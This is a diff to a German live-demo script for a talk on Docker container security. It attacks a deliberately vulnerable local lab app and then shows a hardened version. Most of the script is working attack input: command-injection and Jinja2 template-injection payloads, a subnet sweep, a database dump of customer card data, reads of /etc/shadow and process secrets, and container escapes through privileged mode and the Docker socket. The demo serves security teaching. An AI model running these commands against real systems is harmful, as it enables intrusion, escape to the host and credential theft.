@@ -1,139 +1,171 @@
+#!/usr/bin/env bash
 # =============================================================
 #  DEMO-DREHBUCH: Docker Container Security
-#  Befehle zum Abtippen in der Live-Demo
+#  Alle Befehle zum manuellen Ausführen (nicht als Skript starten)
 # =============================================================
 
+
 # ============================================
-#  SETUP (vor der Präsentation ausführen!)
+#  SETUP
 # ============================================
 
-cd docker-security-demo
 docker compose up -d --build
-# Warte ca. 30 Sekunden bis MySQL bereit ist
-sleep 30
-# Teste: http://localhost:5000 im Browser öffnen
+# Warte ca. 30-60 Sekunden bis MySQL bereit ist
+# Dann im Browser öffnen: http://localhost:5001
 
 
 # ============================================
-#  SCHRITT 1: Command Injection (Einstieg)
+#  SCHWACHSTELLE 1: Command Injection
 # ============================================
 
-# Im Browser http://localhost:5000 öffnen
-# Normaler Ping-Test:
+# Normaler Ping-Test im Browser-Formular:
 #   Eingabe: 8.8.8.8
-#   → Zeigt normales Ping-Ergebnis
 
-# Jetzt Command Injection:
+# Command Injection – Semikolon trennt Befehle in der Shell:
 #   Eingabe: 8.8.8.8; whoami
-#   → Zeigt "root" → Wir sind Root im Container!
+#   → Ausgabe: root
 
-# Mehr Informationen sammeln:
-#   Eingabe: 8.8.8.8; cat /etc/os-release
-#   → Zeigt das Betriebssystem
-
-# Sind wir in einem Container?
-#   Eingabe: 8.8.8.8; cat /proc/1/cgroup
-#   → Zeigt "docker" → Bestätigt: Wir sind im Container
+# Weitere Erkundung:
+#   8.8.8.8; id
+#   8.8.8.8; cat /etc/os-release
+#   8.8.8.8; cat /proc/1/cgroup    ← zeigt "docker" → wir sind im Container
 
 
 # ============================================
-#  SCHRITT 2: Lateral Movement
+#  SCHWACHSTELLE 2: Server-Side Template Injection (SSTI)
 # ============================================
 
-# Netzwerk scannen - welche anderen Container gibt es?
+# Im Browser aufrufen:
+#   http://localhost:5001/report?title=Hallo
+#   → normales Ergebnis
+
+# Template-Expression einschleusen:
+#   http://localhost:5001/report?title={{7*7}}
+#   → Ausgabe: 49 (Jinja2 hat den Ausdruck ausgewertet)
+
+# Flask-Konfiguration mit Secret-Key auslesen:
+#   http://localhost:5001/report?title={{config}}
+
+# Python-Objekt-Hierarchie für RCE:
+#   http://localhost:5001/report?title={{''.__class__.__mro__[1].__subclasses__()}}
+
+
+# ============================================
+#  SCHWACHSTELLE 3: Lateral Movement
+# ============================================
+
+# Netzwerk erkunden:
 #   Eingabe: 8.8.8.8; cat /etc/hosts
-#   → Zeigt die eigene IP
 
 # Andere Container im Netz finden:
-#   Eingabe im Ping-Feld:
-;for i in 1 2 3 4 5 6 7 8 9 10; do ping -c 1 -W 1 172.18.0.$i 2>/dev/null && echo "HOST FOUND: 172.18.0.$i"; done
+;for i in $(seq 1 15); do ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" && echo "  HOST: 172.18.0.$i"; done
 
-# HINWEIS: Die IPs können variieren! Schau welche antworten.
-# Typischerweise:
-#   172.18.0.2 = db
-#   172.18.0.3 = admin
-#   172.18.0.4 = webapp
-
-# Admin-Service entdecken und abfragen:
-#   Eingabe:
+# Admin-Service über Docker-DNS abfragen:
 ; curl -s http://admin:8080/api/config
+# → AWS-Keys, Admin-Zugangsdaten sichtbar!
 
-#   → Zeigt API-Keys und Admin-Zugangsdaten!
-#   (Der Service "admin" ist per Docker-DNS erreichbar)
-
-# Datenbank angreifen mit schwachem Passwort:
-#   Eingabe:
+# Datenbank direkt angreifen:
 ; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
-
-#   → Zeigt alle Kundendaten inkl. Kreditkarten!
+# → Vollständige Kundendaten inkl. Kreditkarteninformationen
 
 
 # ============================================
-#  SCHRITT 3: Container Escape
+#  SCHWACHSTELLE 4: Container Escape (Privileged Mode)
 # ============================================
 
-# Prüfen ob wir im privilegierten Modus sind:
-#   Eingabe:
-; fdisk -l 2>/dev/null | head -5
+# Prüfen ob privilegiert:
+; fdisk -l 2>/dev/null | head -10
+# → Festplatten sichtbar = Container ist privilegiert
 
-#   → Wenn Festplatten angezeigt werden = privilegiert!
-
-# Host-Dateisystem mounten:
-#   Eingabe:
-; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
-
-# HINWEIS: Das Device kann variieren (sda1, vda1, xvda1...)
-# Alternative mit lsblk:
+# Block-Devices anzeigen (richtigen Device-Namen finden):
 ; lsblk
 
-#   → Zeigt verfügbare Blockdevices
-#   → Device-Name merken und im mount-Befehl verwenden
+# Host-Dateisystem einhängen:
+; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
 
 # Host-Dateien lesen:
 ; cat /mnt/host/etc/hostname
-; cat /mnt/host/etc/shadow | head -3
+; cat /mnt/host/etc/shadow | head -5
+# → Vollständiger Zugriff auf das Host-Dateisystem
 
-#   → Wir können das gesamte Host-System lesen!
-#   → GAME OVER - vollständiger Ausbruch aus dem Container
+
+# ============================================
+#  SCHWACHSTELLE 5: Secrets in Umgebungsvariablen
+# ============================================
+
+# Alle Env-Vars des Prozesses auslesen:
+; cat /proc/1/environ | tr '\0' '\n'
+# → DB_PASSWORD=root, SECRET_API_KEY=sk-prod-..., JWT_SECRET=...
+
+# Alternativ von der Docker-Host-Shell:
+docker inspect $(docker compose ps -q webapp) | python3 -m json.tool | grep -A 10 '"Env"'
+
+
+# ============================================
+#  SCHWACHSTELLE 6: Secrets in Image-Layern
+# ============================================
+
+# Von der Docker-Host-Shell – Image-History mit vollständigen Befehlen:
+docker history --no-trunc docker-container-security-webapp 2>/dev/null || \
+docker history --no-trunc $(docker compose images -q webapp)
+# → RUN echo "BACKUP_DB_URL=mysql://backup_user:Backup@2024!@..." sichtbar
+
+# Aus dem Container – die Datei existiert:
+; cat /etc/environment
+
+
+# ============================================
+#  SCHWACHSTELLE 7: Docker Socket Exposure
+# ============================================
+
+# Docker-Socket vorhanden?
+; ls -la /var/run/docker.sock
+
+# Alle laufenden Container über die Docker-API auflisten:
+; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool | head -40
+
+# Neuen Container erzeugen, der / des Hosts einhängt:
+; curl -s --unix-socket /var/run/docker.sock \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | head -5"],"Binds":["/:/host"],"Privileged":true}' \
+    "http://localhost/containers/create?name=escape2"
+
+# Container starten:
+; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape2/start
+
+# Ausgabe des Containers lesen:
+; sleep 2 && curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape2/logs?stdout=1"
+# → /etc/shadow des Hosts wird ausgegeben
 
 
 # ============================================
 #  HÄRTUNG DEMONSTRIEREN
 # ============================================
 
-# Vulnerable Version stoppen
+# Verwundbare Version stoppen
 docker compose down
 
 # Gehärtete Version starten
 docker compose -f docker-compose.hardened.yml up -d --build
-sleep 10
+sleep 15
 
-# Im Browser http://localhost:5000 öffnen (grünes Design = gehärtet)
+# Im Browser öffnen: http://localhost:5001 (grünes Design = gehärtet)
 
-# Command Injection versuchen:
+# Command Injection versuchen → blockiert:
 #   Eingabe: 8.8.8.8; whoami
-#   → "Ungültige Eingabe!" - Input-Validierung greift!
+#   → "Ungültige Eingabe!"
 
-# Selbst wenn jemand reinkäme (anderer Weg):
+# SSTI versuchen:
+#   http://localhost:5001/report → Endpunkt existiert nicht (entfernt)
+
+# Container betreten und Rechte prüfen:
 docker compose -f docker-compose.hardened.yml exec webapp sh
-# → whoami zeigt "appuser" statt "root"
-# → fdisk -l → keine Berechtigung
-# → mount → keine Berechtigung (kein SYS_ADMIN)
-# → curl admin:8080 → Netzwerk nicht erreichbar (Netzwerk-Segmentierung)
+whoami           # → appuser (nicht root)
+fdisk -l         # → Permission denied (kein SYS_ADMIN)
+mount            # → Permission denied
+curl admin:8080  # → Netzwerk nicht erreichbar (Segmentierung greift)
+ls -la /app      # → read-only filesystem
 
 # Aufräumen
 docker compose -f docker-compose.hardened.yml down
-
-
-# ============================================
-#  ZUSAMMENFASSUNG DER HÄRTUNGSMASSNAHMEN
-# ============================================
-#
-# 1. Input-Validierung    → Verhindert Command Injection
-# 2. Non-Root User        → Minimale Rechte im Container
-# 3. Kein --privileged    → Kein Zugriff auf Host-Devices
-# 4. cap_drop: ALL        → Keine Linux Capabilities
-# 5. no-new-privileges    → Keine Rechteeskalation
-# 6. Netzwerk-Segmentierung → Webapp kann DB/Admin nicht erreichen
-# 7. read_only Filesystem → Keine Dateien schreibbar
-# 8. Starke Passwörter    → Kein einfaches Erraten
